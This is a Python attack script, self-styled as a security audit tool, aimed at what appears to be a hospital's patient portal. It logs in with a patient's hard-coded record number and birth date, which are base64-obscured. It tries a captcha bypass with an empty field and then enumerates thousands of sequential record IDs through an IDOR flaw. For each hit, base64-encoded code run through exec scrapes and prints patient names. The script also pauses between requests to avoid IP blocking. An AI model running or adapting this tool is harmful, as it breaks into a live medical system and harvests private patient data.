import requests
from bs4 import BeautifulSoup
import base64
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE=") 
TGL_LAHIR = _decode("MTUwMTE5OTA=") 
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
lock = threading.Lock()
hasil_data = []
total_checked = 0

def login():
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[93m!\033[0m] Bypass Failed: Captcha required by server.")
            print(f"[*] Manual Step: Silakan buka {URL_HAL_LOGIN} di browser.")
            captcha = input("[?] Masukkan Captcha yang terlihat: ")
            
            if not captcha: return False
            
            payload['c'] = captcha
            res = session.post(URL_ACTION_LOGIN, data=payload)
            
            if "login" in res.url:
                print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                return False

        # Mendapatkan Session ID secara dinamis dari cookie jar
        cookies = session.cookies.get_dict()
        session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or (list(cookies.values())[0] if cookies else 'Not Found')
        print(f"[\033[92m+\033[0m] Authentication Success.")
        print(f"[*] Captured Token : {token_t}")
        print(f"[*] Session ID     : {session_id}")
        return True
    except:
        return False

def fetch_data(id_num):
    global total_checked
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        res = session.get(url, timeout=10)
        time.sleep(0.3) # Jeda singkat untuk menghindari blokir IP
        
        with lock:
            total_checked += 1
            # Menampilkan heartbeat setiap 50 ID agar user tahu script tidak hang
            if total_checked % 50 == 0:
                print(f"[*] Scanning... Checked {total_checked} IDs", end='\r')

        if res.status_code != 200: return

        # Protected extraction and masking logic
        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 'Data ditemukan'.
        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOntmb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHttYXNrfScp"))

    except Exception as e:
        pass # Diamkan error koneksi kecil agar terminal tetap bersih

def start_process(start_range, end_range):
    if login():
        print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
        with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
            executor.map(fetch_data, range(start_range, end_range + 1))
        print("\n[*] IDOR Audit Completed. Data displayed in terminal.")

def main_menu():
    while True:
        clear()
        show_banner()
        print(" [1] Auth Test (Captcha Bypass Testing)")
        print(" [2] IDOR Scan (Input Range Manual)")
        print(" [3] IDOR Scan (Range Default)")
        print(" [0] Exit")
        print("\n")
        
        choice = input(" BloraHat > ")

        if choice == '1':
            login()
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '2':
            try:
                count = int(input("[?] Jumlah data yang ingin di scan: "))
                BASE_ID = int(_decode("NTAyMDEz")) # 502013
                # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
                start_process(BASE_ID, BASE_ID + count)
            except ValueError:
                print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '3':
            AWAL = int(_decode("NTAyMDEz")) 
            AKHIR = int(_decode("NTExODU4")) 
            start_process(AWAL, AKHIR)
            input("\nTekan Enter untuk kembali ke menu...")
        elif choice == '0':
            print("Happy Auditing!")
            sys.exit()
        else:
            print("Pilihan tidak valid.")
            input("Tekan Enter untuk mencoba lagi...")

if __name__ == "__main__":
    main_menu()
